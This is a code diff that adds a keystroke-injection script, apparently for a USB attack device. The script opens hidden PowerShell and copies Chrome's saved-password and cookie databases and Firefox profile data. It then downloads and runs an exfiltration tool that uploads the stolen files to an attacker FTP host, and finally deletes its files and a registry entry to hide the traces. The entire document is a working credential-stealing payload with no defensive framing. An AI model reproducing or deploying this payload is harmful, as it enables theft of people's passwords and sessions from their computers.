@@ -1,0 +1,36 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Steal browser passwords and cookies
+STRING $Path = "$env:TEMP\data_stealer"; New-Item -ItemType Directory -Path $Path -Force
+ENTER
+DELAY 500
+REM Chrome passwords
+STRING Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "$Path\chrome_passwords.db" -Force
+ENTER
+DELAY 500
+REM Firefox passwords
+STRING Copy-Item "$env:APPDATA\Mozilla\Firefox\profiles.ini" "$Path\firefox_profiles.ini" -Force
+ENTER
+DELAY 500
+REM Chrome cookies
+STRING Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" "$Path\chrome_cookies.db" -Force
+ENTER
+DELAY 500
+REM Download and execute data exfiltration tool
+STRING Invoke-WebRequest -Uri "http://192.168.1.100/exfil.exe" -OutFile "$Path\exfil.exe"
+ENTER
+DELAY 1000
+STRING Start-Process "$Path\exfil.exe" -ArgumentList "-zip $Path -upload ftp://attacker.com/uploads/"
+ENTER
+DELAY 2000
+REM Clean up traces
+STRING Remove-Item $Path -Recurse -Force
+ENTER
+DELAY 500
+REM Hide evidence
+STRING Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DataStealer" -ErrorAction SilentlyContinue
+ENTER
